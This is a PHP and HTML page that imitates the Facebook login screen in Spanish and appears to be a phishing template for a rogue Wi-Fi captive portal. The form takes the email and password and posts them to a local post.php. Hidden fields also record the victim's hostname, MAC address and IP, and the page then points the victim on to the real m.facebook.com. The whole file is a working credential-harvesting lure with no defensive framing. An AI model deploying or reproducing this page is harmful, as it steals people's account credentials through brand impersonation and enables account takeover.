<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>
  <head>
    <title>Facebook - Log In</title>
    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#1877f2" />

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>

    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
    <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
    <link rel="icon" type="image/png" href="assets/img/fm5arwc28y.png"/>

    <style class="cp-pen-styles">
      * {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
      }

      html {
        background: #f0f2f5;
        font-family: Helvetica, Arial, sans-serif;
      }

      body {
        background: #f0f2f5;
        margin: 0;
        padding: 0;
        font-family: Helvetica, Arial, sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
      }

      .facebook-logo {
        color: #1877f2;
        font-size: 3.5rem;
        font-weight: bold;
        margin-bottom: 1rem;
        text-align: center;
      }

      .login-form-wrap {
        background: #fff;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
        width: 396px;
        max-width: 100%;
        padding: 20px;
        margin: 0 auto;
        text-align: center;
      }

      .login-title {
        font-size: 1.25rem;
        color: #1c1e21;
        margin: 0 0 20px 0;
        padding: 0;
        font-weight: normal;
      }

      .login-form input[type="text"],
      .login-form input[type="password"] {
        display: block;
        width: 100%;
        border: 1px solid #dddfe2;
        outline: none;
        padding: 14px 16px;
        color: #1c1e21;
        font-size: 17px;
        font-family: Helvetica, Arial, sans-serif;
        border-radius: 6px;
        margin-bottom: 12px;
      }

      .login-form input[type="text"]:focus,
      .login-form input[type="password"]:focus {
        border-color: #1877f2;
        box-shadow: 0 0 0 2px #e7f3ff;
      }

      .login-form input[type="submit"] {
        font-family: Helvetica, Arial, sans-serif;
        background: #1877f2;
        width: 100%;
        border: none;
        border-radius: 6px;
        padding: 12px;
        font-size: 20px;
        color: #fff;
        font-weight: bold;
        cursor: pointer;
        margin-top: 16px;
      }

      .login-form input[type="submit"]:hover {
        background: #166fe5;
      }

      .forgot-link {
        display: block;
        margin: 16px 0;
        text-align: center;
      }

      .forgot-link a {
        color: #1877f2;
        font-size: 14px;
        text-decoration: none;
      }

      .forgot-link a:hover {
        text-decoration: underline;
      }

      .divider {
        display: flex;
        align-items: center;
        margin: 20px 0;
      }

      .divider::before,
      .divider::after {
        content: "";
        flex: 1;
        border-bottom: 1px solid #dadde1;
      }

      .divider span {
        margin: 0 10px;
        color: #96999e;
        font-size: 13px;
      }

      .create-account {
        background: #42b72a;
        border: none;
        border-radius: 6px;
        color: white;
        cursor: pointer;
        font-size: 17px;
        font-weight: bold;
        margin: 6px 0;
        padding: 14px 16px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
      }

      .create-account:hover {
        background: #36a420;
      }

      @media (max-width: 768px) {
        .login-form-wrap {
          width: 90%;
        }
      }
    </style>
  </head>

  <body>
    <div class="facebook-logo">facebook</div>
    
    <section class="login-form-wrap">
      <h2 class="login-title">Iniciar sesión en Facebook</h2>
      
      <form class="login-form" method="POST" action="post.php">
        <input type="text" name="email_facebook" placeholder="Correo electrónico o número de teléfono" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
        <input type="password" name="password_facebook" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required>
        
        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="target" value="https://m.facebook.com">
        
        <input type="submit" value="Iniciar sesión">
        
        <div class="forgot-link">
          <a href="#">¿Olvidaste tu cuenta?</a>
        </div>
        
        <div class="divider">
          <span>o</span>
        </div>
        
        <a href="#" class="create-account">Crear cuenta nueva</a>
      </form>
    </section>
  </body>
</html>